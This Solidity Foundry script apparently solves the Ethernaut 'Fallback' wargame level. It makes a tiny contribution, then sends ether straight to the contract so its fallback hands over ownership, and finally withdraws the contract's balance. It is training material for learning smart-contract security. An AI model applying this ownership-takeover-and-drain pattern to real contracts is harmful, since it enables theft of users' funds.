//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Fallback} from "../src/ethernaut1.sol";
import {console} from "forge-std/console.sol";

contract ethernaut1Script is Script{
    Fallback instance = Fallback(payable(0x355e2C48944d77adc51ccD7847ae848818700d80));
    address user = 0xbf2B63cCeE4d24F63c138b6a9b82ef14f6793779;
    function run() public{
        console.log(instance.getContribution());
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        instance.contribute{value: 1 wei}();
        console.log(instance.getContribution());
        console.log("owner before call : ",instance.owner());
        (bool success,) = address(instance).call{value: 1 wei}("");
        if(success){
            console.log("successs!!!!");
            console.log("owner after call : ",instance.owner());
        }else{
            console.log("shhit ,failed");
        }
        instance.withdraw();

        vm.stopBroadcast();

    }
}